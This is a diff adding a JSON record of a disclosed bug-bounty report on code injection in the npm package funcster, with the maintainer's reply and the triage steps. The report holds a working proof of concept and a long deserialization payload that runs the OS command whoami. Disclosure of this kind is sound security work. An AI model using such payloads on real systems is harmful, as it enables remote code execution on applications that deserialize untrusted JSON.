@@ -1,0 +1,453 @@
+{
+  "id": 350401,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNTA0MDE=",
+  "url": "https://hackerone.com/reports/350401",
+  "title": "Insecure implementation of deserialization in funcster",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-05-11T10:44:16.888Z",
+  "submitted_at": "2018-05-11T10:44:16.888Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "greendog",
+    "url": "/greendog",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/813/4c86d10bc8698ec3a620fa466bc1ef2873632ef1_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-06-15T21:48:25.666Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-06-15T21:47:59.922Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report code injection in serialization package funcster.\nIt allows execute arbitrary code during deserialization of JSON.\n\n# Module\n\n**module name:** funcster\n**version:** 0.0.3\n**npm page:** `https://www.npmjs.com/package/funcster`\n\n## Module Description\n\nThis library contains utilities for serializing and deserializing functions. It provides recursive traversal to discover both serialized and unserialized functions nested within objects and arrays. This is particularly useful for embedding functions into JSON objects.\n\n## Module Stats\n\n4 downloads in the last week\n\n# Vulnerability\n\n## Vulnerability Description\n\nIn an application uses \"funcster\" package to deserialize JSON into object and if an attacker controls this JSON, then an attacker can get arbitrary code execution in the application.\nThe package reconstructs an object with functions from JSON. But it's supposed that functions of the object are not executed until they are invoked directly in the code later. Using IIFE (immediately-invoked function expression), we as attackers can force funcster to execute our function from JSON during deserialization process.\n\n## Steps To Reproduce:\n\nThe vulnerability exists because during deserialization process funcster creates a new module with exported functions from JSON.  Here is this part of code:\n```\nreturn \"module.exports=(function(module,exports){return{\" + entries + \"};})();\";\n```\n\nUsing IIFE (immediately-invoked function expression), we as attackers can force funcster to execute our function from JSON during deserialization. The idea is similar to one described in this article -  https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/\n\nHere is a PoC:\n```\nvar funcster = require('funcster');\nvar serJSON = { __js_function: 'function testa(){var pr = this.constructor.constructor(\"return process\")(); pr.stdout.write(\"param-pam-pam\") }()' }\nvar newFunc = funcster.deepDeserialize(serJSON);\n```\n\nfuncster cuts standard built-in objects, but we can bring them back using the global object(this) and the \"process\" object.\nHere is a JSON payload to get OS command execution(whoami):\n```\n { __js_function: \"function testa(){var process = this.constructor.constructor('return process')(); spawn_sync = process.binding('spawn_sync'); normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&&(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(' ');typeof a.shell==='string'?c=a.shell:c='/bin/sh',b=['-c',g];}typeof a.argv0==='string'?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f+'='+d[f]);return{file:c,args:b,options:a,envPairs:e};};spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.options;var c;if(a.file=d.file,a.args=d.args,a.envPairs=d.envPairs,a.stdio=[{type:'pipe',readable:!0,writable:!1},{type:'pipe',readable:!1,writable:!0},{type:'pipe',readable:!1,writable:!0}],a.input){var g=a.stdio[0]=util._extend({},a.stdio[0]);g.input=a.input;}for(c=0;c<a.stdio.length;c++){var e=a.stdio[c]&&a.stdio[c].input;if(e!=null){var f=a.stdio[c]=util._extend({},a.stdio[c]);isUint8Array(e)?f.input=e:f.input=Buffer.from(e,a.encoding);}}/*process.stdout.write(JSON.stringify(a))*/;var b=spawn_sync.spawn(a);if(b.output&&a.encoding&&a.encoding!=='buffer')for(c=0;c<b.output.length;c++){if(!b.output[c])continue;b.output[c]=b.output[c].toString(a.encoding);}return b.stdout=b.output&&b.output[1],b.stderr=b.output&&b.output[2],b.error&&(b.error= b.error + 'spawnSync '+d.file,b.error.path=d.file,b.error.spawnargs=d.args.slice(1)),b;};var x= spawnSync('whoami'); process.stdout.write(x.output.toString());}()\"}\n```\n\n## Patch\n\nI see no ways to patch it because it is a consequence of design/approach which funster uses to serialize/deserialize object.\n\n## Supporting Material/References:\n\n- Ubuntu 16.04\n- node v6.11.3\n- npm 5.5.1 \n\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nAn attacker can craft a special JSON file with malicious code which will be executed during deserialization by funcster. So the attacker can achieve OS command execution.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": "2018-07-15T21:48:00.000Z",
+  "allow_singular_disclosure_after": -163764212.21462148,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "mashoud1122",
+    "kapytein",
+    "bl4de",
+    "savitar0x01",
+    "eveeez",
+    "oddfuturex"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.7,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 10267,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "funcster",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 2767578,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-05-20T08:35:14.654Z",
+      "updated_at": "2018-05-20T08:35:14.654Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2767618,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @greendog , \n\nThanks a lot for reporting the vulnerability.\nI invited the maintainers for the project to join the issue and help triage the report.\n\n",
+      "automated_response": false,
+      "created_at": "2018-05-20T08:35:42.327Z",
+      "updated_at": "2018-05-20T08:35:42.327Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2767652,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-05-20T08:36:14.648Z",
+      "updated_at": "2018-05-20T08:36:14.648Z",
+      "additional_data": {
+        "old_severity": "High",
+        "new_severity": "High (8.7)",
+        "old_severity_id": 152328,
+        "new_severity_id": 156397
+      },
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2768756,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-05-20T15:41:58.528Z",
+      "updated_at": "2018-05-20T15:41:58.528Z",
+      "actor": {
+        "username": "jeffomatic",
+        "cleared": false,
+        "verified": false,
+        "url": "/jeffomatic",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2803796,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @jeffomatic,\n\nThanks for joining.\nCan you confirm the vulnerability described here?",
+      "automated_response": false,
+      "created_at": "2018-05-27T19:10:13.928Z",
+      "updated_at": "2018-05-27T19:10:13.928Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2804148,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for the heads-up. I agree with the analysis in the bug report...funcster basically does an `eval`, and as with anything of that nature it's going to be susceptible to abuse of the kind detailed in the report. The intent behind this library was to run the deserialize function on output of the serialize function, as opposed to consuming arbitrary user-provided input.\n\nI think the best I can do here is post a warning in the README...this library hasn't been touched in at least five years and I haven't used it for any projects since it was originally written.",
+      "automated_response": false,
+      "created_at": "2018-05-28T03:26:20.797Z",
+      "updated_at": "2018-05-28T03:26:20.797Z",
+      "actor": {
+        "username": "jeffomatic",
+        "cleared": false,
+        "verified": false,
+        "url": "/jeffomatic",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2825632,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@jeffomatic I think that makes sense. Can you add that warning in a visible place, preferably at the top of the README?\n\n@greendog are you ok with this not being disclosed as a vulnerability?",
+      "automated_response": false,
+      "created_at": "2018-05-31T19:36:23.378Z",
+      "updated_at": "2018-05-31T19:36:23.378Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2825636,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ChangedScope",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-05-31T19:37:14.234Z",
+      "updated_at": "2018-05-31T19:37:14.234Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "old_scope": "Other module",
+      "new_scope": "funcster",
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2825695,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Yeah, it is fine. ",
+      "automated_response": false,
+      "created_at": "2018-05-31T19:54:27.920Z",
+      "updated_at": "2018-05-31T19:54:27.920Z",
+      "actor": {
+        "username": "greendog",
+        "cleared": false,
+        "verified": false,
+        "url": "/greendog",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/813/4c86d10bc8698ec3a620fa466bc1ef2873632ef1_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2825699,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Ok thanks.\n\n@jeffomatic can you please move forward with the change and I'll close the report once you updated the README?",
+      "automated_response": false,
+      "created_at": "2018-05-31T19:55:35.014Z",
+      "updated_at": "2018-05-31T19:55:35.014Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2891763,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-06-15T21:47:19.193Z",
+      "updated_at": "2018-06-15T21:47:19.193Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "greendog",
+        "url": "/greendog"
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2891767,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-06-15T21:47:59.951Z",
+      "updated_at": "2018-06-15T21:47:59.951Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2891771,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ManuallyDisclosed",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-06-15T21:48:25.564Z",
+      "updated_at": "2018-06-15T21:48:25.564Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
